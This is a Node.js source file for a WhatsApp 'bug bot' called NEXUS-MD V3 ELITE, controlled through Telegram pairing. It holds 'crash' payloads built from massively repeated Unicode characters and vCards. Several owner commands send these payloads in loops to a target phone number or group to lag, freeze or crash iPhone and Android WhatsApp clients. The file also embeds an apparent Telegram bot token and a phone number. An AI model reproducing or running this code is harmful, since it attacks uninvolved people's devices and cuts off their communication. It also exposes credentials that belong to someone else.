const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay 
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 ELITE",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false // Private Mode
};

// --- 🌐 WEB SERVER ---
app.get('/', (req, res) => res.send('Nexus Elite Bug System is Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        printQRInTerminal: false
    });

    // --- 🤖 TELEGRAM PAIRING ---
    tgBot.on('message', async (msg) => {
        if (msg.text && /^\d+$/.test(msg.text)) {
            try {
                let code = await sock.requestPairingCode(msg.text);
                tgBot.sendMessage(msg.chat.id, `🔥 *NEXUS-MD ELITE CODE:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ Error!"); }
        }
    });

    // --- 📩 WHATSAPP HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;
            if (!isOwner) return; // ඔයාට විතරයි වැඩ කරන්නේ

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // --- 🦠 BUG PAYLOADS ---
            const bug1 = "☠️" + "ꦿ".repeat(50000); // Unicode Kill
            const bug2 = "🔥" + "᥋".repeat(60000); // iOS Lag
            const bug3 = "❄️" + "꠵".repeat(70000); // UI Freeze
            const vcardBug = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(250);

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *${botConfig.botName}* 〕───┈
│
│ 🦠 *KILLER BUG MENU (9 TYPES)*
│
├ ☠️ *1. .ios1* [number] - iPhone Hard Lag
├ 🔥 *2. .ios2* [number] - iPhone UI Freeze
├ 💀 *3. .kill* [number] - Android Crash
├ ❄️ *4. .freeze* [number] - System Lag
├ 📍 *5. .loc* [number] - Location Bug
├ 📇 *6. .vcard* [number] - Contact Crash
├ 🌀 *7. .group* [jid] - Group Destroyer
├ 🧨 *8. .bomb* [number] - Spam Bug
├ 🌌 *9. .the_end* [number] - Total System Wipe
│
╰─────────────┈
 ⚡ *STATUS:* PRIVATE MODE
 👑 *DEV:* SASIYA MD`;
                    
                    // ලස්සන පින්තූරයක් එක්ක මෙනු එක යවන්න (image url එකක් දාන්න පුළුවන්)
                    await sock.sendMessage(from, { 
                        text: menu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD V3 ELITE BUG SYSTEM",
                                body: "iPhone & Android Destroyer",
                                mediaType: 1,
                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", // මෙතනට කැමති image එකක් දාන්න
                                sourceUrl: "https://github.com/SasiyaMD"
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'ios1':
                case 'ios2':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🚀 Sending iPhone Killer Bug..." });
                    for(let i=0; i<8; i++) {
                        await sock.sendMessage(target, { text: bug2 });
                        await delay(400);
                    }
                    await sock.sendMessage(from, { text: "💀 iPhone Target Is Dead!" });
                    break;

                case 'group':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🧨 Group Bug Deploying..." });
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(text, { text: bug1 + bug3 });
                    }
                    break;

                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *THE END SYSTEM DEPLOYED...*" });
                    for(let i=0; i<15; i++) {
                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
                    }
                    break;

                case 'vcard':
                    if (!text) return;
                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard: vcardBug }] } });
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('ELITE BUG BOT READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
